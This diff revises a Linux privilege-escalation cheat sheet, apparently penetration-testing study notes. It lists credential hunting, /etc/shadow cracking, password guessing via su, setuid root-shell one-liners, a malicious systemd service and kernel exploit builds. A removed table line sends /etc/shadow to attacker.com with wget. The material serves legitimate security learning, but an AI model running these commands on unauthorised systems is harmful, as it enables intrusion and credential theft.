@@ -88,6 +88,9 @@ hostname
 
 # Check your sudo privileges
 sudo -l
+#if you currently dont have a password and want to see if you can run sudo to decide if you want to hunt for the users pass
+#If you get info, then you can run sudo otherwise itll show you that your current user cant run sudo
+sudo -v
 
 # Check for interesting files in home directories
 ls -la ~
@@ -101,6 +104,10 @@ df -h | grep -v "tmpfs\|proc\|sysfs\|devtmpfs\|cgroup"
 find /var/backup -type f 2>/dev/null
 find /var/logs -type f 2>/dev/null
 find /opt -type f -perm -o+r 2>/dev/null
+
+#Look for other users on the system and try out their username as their password
+su user
+#put user for password
 ```
 
 ### Process Enumeration
@@ -113,46 +120,24 @@ ps aux | grep "^root"
 watch -n 1 "ps aux | grep root"
 
 # Use pspy to monitor processes without root permissions
-./pspy64 -pf # Monitor both processes and file system events
+./pspy64  # be paitent and look for root/uid 0 related events
 ```
 
-### File Transfer
-
-```bash
-# Host files in current directory through HTTP
-python -m SimpleHTTPServer 1234
-
-# On target, download all files recursively
-cd /tmp
-wget -r --no-parent http://10.11.0.79:1234/
-chmod 777 *
-```
-
-**TIP**: Create aliases for these commands to quickly set them up, e.g., `webup`
 
 ### Essential Enumeration Scripts
 
 ```bash
 # Automated enumeration tools
-./les.sh                    # Linux Exploit Suggester
 ./LinEnum.sh                # Basic enumeration script
-./linpeas.sh                # Comprehensive enumeration
-./linux-enum-mod.sh         # Modified Linux enum script
+./linpeas_fat.sh -e                # Best linpeas flag and method of running
 ./linux-exploit-suggester-2.pl # Suggest kernel exploits
-./lse.sh -l 1               # Linux Smart Enumeration (level 1)
-./lse.sh -l 2               # Linux Smart Enumeration (level 2)
+./lse.sh -l2               # Linux Smart Enumeration (level 2)
 ./pspy32                    # Process monitoring (32-bit)
 ./pspy64                    # Process monitoring (64-bit)
 ./suid3num.py               # Analyze SUID binaries
-./unix-privesc-check.sh     # Classic privilege escalation checks
 
-# Copy enumeration scripts to target via base64 (when file transfer is restricted)
-## Generate on local machine:
-cat linpeas.sh | base64 -w 0
-
-## Decode on target:
-echo "BASE64_OUTPUT_HERE" | base64 -d > linpeas.sh
-chmod +x linpeas.sh
+#I reccomend running linpeas_fat.sh -e first and formost. Then run linenum.sh -t or lse.sh -l2
+#Make notes in order of priority or your preference of attack. For example if linpeas shows a sudo group user, you might want to try to find their creds
 ```
 
 ### Advanced Process Monitoring
@@ -193,9 +178,8 @@ perl linux-exploit-suggester-2.pl
 1. Identify kernel version
 2. Search for matching exploits on exploit-db
 3. Download and examine exploit code
-4. Compile on target system (if possible) or cross-compile
-5. Execute with proper parameters
-6. Clean up afterward to avoid system instability
+4. Compile on target system (if possible) or cross-compile(use the -static flag when you can and remeber glibc and library dependencies)
+
 
 ## 🔑 Password Mining & Credentials Hunting
 
@@ -231,11 +215,7 @@ cat /etc/shadow
 # If readable, crack passwords:
 unshadow /etc/passwd /etc/shadow > unshadowed.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
-# Generate a new password hash to insert
-mkpasswd -m sha-512 newpassword
 
-# Check for previously used passwords
-cat /etc/security/opasswd
 
 # Web server configs - often contain database credentials
 find /etc/apache2/ -name "*.conf" -type f -exec grep -i -l "pass\|db_passwd\|dbpasswd\|pwd" {} \;
@@ -255,6 +235,9 @@ cat /etc/ssh/sshd_config | grep -i "PermitRootLogin\|PasswordAuthentication"
 grep -r --include="*.php" -l "connect\|mysqli\|getenv" /var/www/ 2>/dev/null
 grep -r --include="*.js" -l "api_key\|apikey\|password\|passwd\|pwd" /var/www/ 2>/dev/null
 ```
+
+Always ensure you reference external services running and then deciding what check. If you see an external service, even if you didnt use it for initial foothold, 
+google online if stores credintials somewhere and looking into those files as well
 
 ### Command History
 
@@ -278,25 +261,13 @@ find / -name "*_history" -type f 2>/dev/null
 find / -name "*_history" -type f 2>/dev/null | xargs grep -i "password\|pass\|pwd"
 ```
 
-### Memory Inspection
-
-```bash
-# Get Process ID of target service (e.g., FTP)
-ps -ef | grep ftp
-
-# Check memory boundaries of process
-gdb -p <PID>
-info proc mappings
-
-# Dump the process memory
-dump memory /tmp/heap.txt 0xSTART_ADDR 0xEND_ADDR
-
-# Search for passwords in memory dump
-strings /tmp/heap.txt | grep -i passw
-```
 
 ### Recursive Search
 
+Two main things to note here when preforming this search. Make sure you change the string. So maybe you add passw, and then try password, pwd, creds, cred etc
+
+The second high fidelity check is using usernames; so if you note some user who is a member of the docker or sudo group then you may want to desprately get their password
+and so I would use the commands below and search for them via username
 ```bash
 # Search for files with "passw" in filename
 locate passw | more
@@ -306,6 +277,7 @@ grep --color=auto -R -i "passw" --color=always /etc/ 2>/dev/null
 grep --color=auto -R -i "passw" --color=always /var/www/ 2>/dev/null
 grep --color=auto -R -i "passw" --color=always /home/ 2>/dev/null
 grep --color=auto -R -i "passw" --color=always /opt/ 2>/dev/null
+grep --color=auto -R -i "passw" --color=always /mnt/ 2>/dev/null
 
 # Find files containing password strings (less noisy)
 find /etc -type f -exec grep -l "password" {} \; 2>/dev/null
@@ -373,38 +345,6 @@ You can execute commands as that user without a password:
 ```bash
 sudo -u scriptmanager <command>
 ```
-
-### Shell Escape Sequences
-
-Common binaries with escape sequences:
-
-|Binary|Escape Sequence|
-|---|---|
-|ftp|`!` or `!sh`|
-|vim|`:!sh` or `:set shell=/bin/bash:shell`|
-|less|`!sh` or `v` then `:!sh`|
-|man|`!sh` or `!bash`|
-|find|`find / -name x -exec /bin/sh \;`|
-|awk|`awk 'BEGIN {system("/bin/sh")}'`|
-|nano|`^R^X` then `reset; sh 1>&0 2>&0`|
-|python|`import os; os.system('/bin/sh')`|
-|nmap|`nmap --interactive` then `!sh`|
-|zip|`zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"`|
-|apache2|`apache2 -f /etc/shadow`|
-|perl|`perl -e 'exec "/bin/sh";'`|
-|ruby|`ruby -e 'exec "/bin/sh"'`|
-|lua|`lua -e 'os.execute("/bin/sh")'`|
-|irb|`exec "/bin/sh"`|
-|gcc|`gcc -wrapper /bin/sh,-s .`|
-|tar|`tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`|
-|more|`!sh`|
-|mysql|`\! /bin/sh` or `\! bash`|
-|wget|`--post-file=/etc/shadow http://attacker.com/`|
-|pico|`^R^X` then `reset; sh 1>&0 2>&0`|
-|tee|`echo "evil"|
-|ed|`!'/bin/bash'`|
-
-**Note**: Check for the latest escape sequences at [GTFOBins](https://gtfobins.github.io/)
 
 ```bash
 # Quick script to check GTFOBins for a list of sudo-allowed binaries:
@@ -750,6 +690,31 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -la {} \; 2>/dev/null 
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -la {} \; 2>/dev/null | grep -v -E "ping|mount|umount|sudo|su|passwd|unix_chkpwd|newgrp|gpasswd|chsh|at|ssh-keysign|pkexec|chfn|hosts_access|dbus-daemon-launch-helper|exim"
 ````
 
+## Linux File capabilities exploitation
+
+Liux capabilties are a granular way of providing elevated permissions to a file to allow it to do a specific action. For example a capability can allow a file to preform file reads as if they are root(meaning read any file)
+```bash
+# Find binaries with capabilities
+getcap -r / 2>/dev/null
+
+# Common dangerous capabilities:
+# CAP_SETUID - allows changing of UID
+# CAP_DAC_OVERRIDE - bypass file read/write/execute permission checks
+# CAP_DAC_READ_SEARCH - bypass file/directory read permission checks
+# CAP_SYS_ADMIN - basically root
+# CAP_NET_RAW - packet sniffing
+# CAP_CHOWN - Change file ownership
+# +ep means the file can do anything as root(basically setuid)
+
+# Example exploitation:
+# If python has cap_setuid+ep
+/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+# If perl has cap_setuid+ep
+/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+
+#There are infinite potential avenues and thus its important if you encounter an unfimilar binary to look at the documentation or run -h or google the name of the binary with priv esc
+```
 ### Shell Escape Sequences
 
 Check GTFOBins for exploitation techniques: [GTFOBins](https://gtfobins.github.io/)
@@ -812,6 +777,8 @@ for suid in $(find / -type f -perm -4000 2>/dev/null); do strings $suid | grep -
 
 # Find custom (non-standard) SUID binaries that might be vulnerable
 find / -type f -perm -4000
+
+#Check the strings in SUID binary, espcially if it looks custom and see if its calling other programs or executing files without full path
 
 ### Environment Variable Exploitation
 
@@ -920,7 +887,7 @@ done
 ### Identifying Vulnerable Startup Scripts
 
 ```bash
-# Check for writable startup scripts in various locations
+# Check for startup scripts writable by the current user in various locations
 find /etc/init.d -writable 2>/dev/null
 find /etc/rc.d -writable 2>/dev/null
 find /etc/rc.d/init.d -writable 2>/dev/null
@@ -980,6 +947,9 @@ EOF
 # Enable and start the malicious service if you have sudo rights
 sudo systemctl enable privesc.service
 sudo systemctl start privesc.service
+
+#Post running rootbash to upgrade our shell fully
+python -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")' #You can also use python3 with the same command if its present instead
 ```
 
 ### One-liners to Identify Service Vulnerabilities
@@ -997,83 +967,6 @@ lsof -u root | grep REG | grep -v "mem" | grep -v "txt" | grep -v "cwd" | grep -
 # Find scripts in PATH that are executed by root but writable by you
 for p in $(echo $PATH | tr ":" " "); do find $p -writable -type f 2>/dev/null; done
 ```
-
-## 💾 Kernel Exploits (Last Resort)
-
-### Detection and Identification
-
-```bash
-# Get detailed kernel information
-uname -a
-cat /proc/version
-cat /etc/issue
-rpm -q kernel  # Red Hat/CentOS
-dpkg --list | grep linux-image  # Debian/Ubuntu
-
-# Get CPU information
-lscpu
-cat /proc/cpuinfo
-
-# Get Linux distribution details
-cat /etc/os-release
-lsb_release -a
-
-# Check for installed security patches
-dpkg -l | grep -i security  # Debian/Ubuntu
-rpm -qa | grep -i security  # Red Hat/CentOS
-
-# Check loaded kernel modules (look for outdated modules)
-lsmod
-cat /proc/modules
-```
-
-### Automated Kernel Exploit Detection
-
-```bash
-# Using Linux Exploit Suggester
-./linux-exploit-suggester-2.pl -k $(uname -r)
-
-# Using linPEAS
-./linpeas.sh | grep -i "kernel version\|CVE"
-
-# Using Linux Smart Enumeration (level 2 for kernel info)
-./lse.sh -l 2 | grep -i "kernel"
-
-# Find exploits for the current kernel
-searchsploit $(uname -r)
-```
-
-### Common Kernel Exploits
-
-```bash
-# Dirty COW (CVE-2016-5195) - Works on Linux 2.6.22 through 4.8.3
-# Running exploit creates SUID root shell
-gcc -pthread dirty.c -o dirty -lcrypt
-./dirty "newrootpassword"
-
-# PTRACE_TRACEME local root (CVE-2010-3301)
-gcc pwn.c -o pwn
-./pwn
-
-# Mempodipper (CVE-2012-0056) - For Linux 2.6.39 < 3.2.2
-gcc mempodipper.c -o mempodipper
-./mempodipper
-
-# RDS (CVE-2010-3904) - For Linux < 2.6.36-rc8
-gcc rds.c -o rds
-./rds
-
-# perf_swevent_init (CVE-2013-2094) - For kernel 3.8.0/3.8.1
-gcc perf_swevent.c -o perf_swevent
-./perf_swevent
-```
-
-### Using Kernel Exploits Safely
-
-- Check the exploit for malicious code before compiling/running
-- Make a backup of important files before running kernel exploits
-- Try to find an alternate privilege escalation path before resorting to kernel exploits
-- Test on a similar system if possible
 
 ## 📡 Service Exploitation (MySQL, Apache, etc.)
 
@@ -1264,4 +1157,74 @@ find / -type d -perm -o+w 2>/dev/null | grep -v '/proc\|/sys\|/dev'
 
 # Find files that are both executable and writable by current user
 find / -type f -executable -writable 2>/dev/null | grep -v '/proc\|/sys\|/dev'
+```
+
+## 💾 Kernel Exploits (Last Resort)
+
+### Detection and Identification
+
+```bash
+# Get detailed kernel information
+uname -a
+cat /proc/version
+cat /etc/issue
+rpm -q kernel  # Red Hat/CentOS
+dpkg --list | grep linux-image  # Debian/Ubuntu
+
+# Get CPU information
+lscpu
+cat /proc/cpuinfo
+
+# Get Linux distribution details
+cat /etc/os-release
+lsb_release -a
+
+# Check for installed security patches
+dpkg -l | grep -i security  # Debian/Ubuntu
+rpm -qa | grep -i security  # Red Hat/CentOS
+
+# Check loaded kernel modules (look for outdated modules)
+lsmod
+cat /proc/modules
+```
+
+### Automated Kernel Exploit Detection
+
+```bash
+# Using Linux Exploit Suggester
+./linux-exploit-suggester-2.pl -k $(uname -r)
+
+# Using linPEAS
+./linpeas.sh | grep -i "kernel version\|CVE"
+
+# Using Linux Smart Enumeration (level 2 for kernel info)
+./lse.sh -l 2 | grep -i "kernel"
+
+# Find exploits for the current kernel
+searchsploit $(uname -r)
+```
+
+### Common Kernel Exploits
+
+```bash
+# Dirty COW (CVE-2016-5195) - Works on Linux 2.6.22 through 4.8.3
+# Running exploit creates SUID root shell
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty "newrootpassword"
+
+# PTRACE_TRACEME local root (CVE-2010-3301)
+gcc pwn.c -o pwn
+./pwn
+
+# Mempodipper (CVE-2012-0056) - For Linux 2.6.39 < 3.2.2
+gcc mempodipper.c -o mempodipper
+./mempodipper
+
+# RDS (CVE-2010-3904) - For Linux < 2.6.36-rc8
+gcc rds.c -o rds
+./rds
+
+# perf_swevent_init (CVE-2013-2094) - For kernel 3.8.0/3.8.1
+gcc perf_swevent.c -o perf_swevent
+./perf_swevent
 ```
